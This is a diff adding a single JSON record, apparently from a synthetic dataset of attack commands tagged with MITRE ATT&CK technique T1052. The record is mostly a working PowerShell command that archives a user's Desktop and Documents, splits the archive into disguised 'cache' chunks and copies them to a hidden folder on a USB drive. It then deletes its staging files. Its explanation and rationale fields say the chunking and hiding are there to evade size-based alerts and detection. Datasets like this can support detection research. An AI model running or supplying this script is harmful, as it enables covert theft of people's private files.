@@ -1,0 +1,24 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$usb=(Get-Volume -DriveType Removable | Select -First 1 -ExpandProperty DriveLetter)+':\\'; $zip=\"$env:TEMP\\stage.zip\"; Compress-Archive -Path \"$env:USERPROFILE\\Desktop\\*\", \"$env:USERPROFILE\\Documents\\*\" -DestinationPath $zip -Force; $chunkDir=Join-Path $env:TEMP 'chunks'; New-Item -ItemType Directory -Force -Path $chunkDir | Out-Null; $b=[IO.File]::ReadAllBytes($zip); $size=4194304; for($i=0;$i -lt $b.Length;$i+=$size){ $end=[Math]::Min($i+$size,$b.Length); [IO.File]::WriteAllBytes((Join-Path $chunkDir (\"cache_{0:D3}.bin\" -f [int]($i/$size))), $b[$i..($end-1)]) }; $dst=Join-Path $usb '.cache'; New-Item -ItemType Directory -Force -Path $dst | Out-Null; (Get-Item $dst).Attributes='Hidden'; Copy-Item (Join-Path $chunkDir 'cache_*.bin') $dst -Force; Remove-Item $zip -Force; Remove-Item $chunkDir -Recurse -Force",
+  "explanation": "Archives targeted user data, splits into small chunks, and writes the pieces to a hidden folder on the USB using Copy-Item to blend with normal file sizes and reduce detection.",
+  "rationale_steps": [
+    "Find removable drive",
+    "Compress data for efficiency",
+    "Split archive into smaller chunks to evade size-based alerts",
+    "Create hidden destination on the USB",
+    "Copy chunks to USB using Copy-Item and remove staging files"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-1ea95c55-7419b2ba",
+  "source_prompt_hash": "1ea95c55",
+  "timestamp_utc": "2025-09-30T05:10:56.829613Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
